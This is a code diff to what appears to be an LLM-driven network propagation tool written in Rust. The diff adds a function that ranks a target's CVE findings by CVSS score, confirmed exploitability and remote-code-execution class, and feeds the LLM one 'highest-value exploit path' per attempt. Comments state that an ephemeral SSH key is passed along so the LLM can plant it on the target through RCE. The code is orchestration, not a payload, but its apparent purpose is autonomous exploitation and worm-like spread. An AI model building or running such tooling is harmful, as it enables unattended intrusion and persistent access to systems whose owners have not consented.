@@ -21,7 +21,8 @@ use physarum_llm::{
     ArtifactType, BootstrapAction, DiscoveryQuery, ExecutionResultSummary, LlmAttemptEvidence,
     LlmClient, NextAction, OsHint, OsHintSource, PatternFindingSummary, PolicyDecision, PolicyGate,
     PolicyRejectionReason, PortScan, PortState, PropagationMethod, PropagationMethodClass,
-    RejectedStrategy, TemplateMeta, TemplateSelectionQuery, TransportProtocol, MAX_ATTEMPTS,
+    RejectedStrategy, TemplateMeta, TemplateSelectionQuery, TransportProtocol,
+    VulnerabilitySource, MAX_ATTEMPTS,
 };
 use physarum_scanner::{
     effective_stimulus_ports, result_from_open_port, EvidenceSource as ScanEvidenceSource,
@@ -139,6 +140,20 @@ pub async fn run(
         tracing::info!(%target, ?cve_ids, "CVE candidates in DiscoveryQuery");
     }
 
+    // Rank findings by propagation weight (PhysarumSpore × RCE × CVSS).
+    // Each attempt presents ONE candidate to the LLM, cycling through the ranked list.
+    // This focuses the LLM on the highest-value exploit path per attempt rather than
+    // overwhelming it with all findings and letting it choose arbitrarily.
+    let ranked_candidates = rank_propagation_candidates(&pattern_summaries);
+    if !ranked_candidates.is_empty() {
+        tracing::info!(
+            %target,
+            candidate_count = ranked_candidates.len(),
+            top_cve = %ranked_candidates[0].check_id,
+            "ranked CVE propagation candidates"
+        );
+    }
+
     // ── Ephemeral SSH keypair (Exploit class only) ────────────────────────────
     // Generated once per target visit — the same pubkey is embedded in every
     // DiscoveryQuery so the LLM can plant it via RCE in any attempt.
@@ -161,6 +176,16 @@ pub async fn run(
     let mut rejected: Vec<RejectedStrategy> = Vec::new();
 
     for attempt_number in 1..=MAX_ATTEMPTS {
+        // Present ONE ranked candidate per attempt so the LLM focuses on the
+        // highest-weight exploit path. Cycle through ranked_candidates across
+        // attempts; fall back to all summaries when there are no ranked ones.
+        let attempt_findings: Vec<PatternFindingSummary> = if ranked_candidates.is_empty() {
+            pattern_summaries.clone()
+        } else {
+            let idx = (attempt_number as usize - 1).min(ranked_candidates.len() - 1);
+            vec![ranked_candidates[idx].clone()]
+        };
+
         let query = DiscoveryQuery {
             target: IpAddr::V4(target),
             ports: port_scans.clone(),
@@ -173,7 +198,7 @@ pub async fn run(
                 .collect(),
             rejected_strategies: rejected.clone(),
             attempt_number,
-            pattern_findings: pattern_summaries.clone(),
+            pattern_findings: attempt_findings,
             source_ip: local_ip.map(IpAddr::V4),
             ephemeral_pubkey: ephemeral_key.as_ref().map(|k| k.pubkey.clone()),
         };
@@ -1455,6 +1480,54 @@ pub(crate) async fn generate_ephemeral_keypair() -> anyhow::Result<EphemeralKey>
         privkey_path,
         pubkey: pubkey.trim().to_string(),
     })
+}
+
+// ── Propagation candidate ranking ────────────────────────────────────────────
+
+/// Maximum number of ranked CVE candidates cycled through the attempt loop.
+const MAX_PROPAGATION_CANDIDATES: usize = 6;
+
+/// Rank `PatternFindingSummary` entries by propagation weight and return the top
+/// `MAX_PROPAGATION_CANDIDATES` as an ordered list.
+///
+/// Weight formula per candidate:
+///   score = cvss × source_mult × class_mult × confidence
+///   source_mult = 2.0  when source == PhysarumSpore (live template confirmed exploitability)
+///   source_mult = 1.0  for LocalAdvisoryCache / OsvFeed (version-based inference)
+///   class_mult  = 1.5  when exploit_class == "RemoteCodeExecution"
+///   class_mult  = 1.0  otherwise
+///   cvss defaults to 5.0 when absent (mid-range assumption)
+///
+/// Findings with no vulnerability_candidates or is_actionable=false are excluded.
+/// The caller presents ranked[attempt_number - 1] to the LLM so each attempt
+/// focuses on the next-highest-priority exploit path.
+fn rank_propagation_candidates(
+    findings: &[PatternFindingSummary],
+) -> Vec<PatternFindingSummary> {
+    let candidate_weight = |f: &PatternFindingSummary| -> f32 {
+        f.vulnerability_candidates.iter().map(|c| {
+            let cvss = c.cvss_score.unwrap_or(5.0);
+            let source_mult = if c.source == VulnerabilitySource::PhysarumSpore { 2.0f32 } else { 1.0f32 };
+            let class_mult = if c.exploit_class.as_deref() == Some("RemoteCodeExecution") { 1.5f32 } else { 1.0f32 };
+            cvss * source_mult * class_mult * c.confidence
+        }).fold(0.0f32, f32::max)
+    };
+
+    let mut scored: Vec<(f32, &PatternFindingSummary)> = findings
+        .iter()
+        .filter(|f| f.is_actionable && !f.vulnerability_candidates.is_empty())
+        .map(|f| (candidate_weight(f), f))
+        .collect();
+
+    scored.sort_by(|a, b| {
+        b.0.partial_cmp(&a.0).unwrap_or(std::cmp::Ordering::Equal)
+    });
+
+    scored
+        .into_iter()
+        .take(MAX_PROPAGATION_CANDIDATES)
+        .map(|(_, f)| f.clone())
+        .collect()
 }
 
 // ── Template catalog builder ─────────────────────────────────────────────────
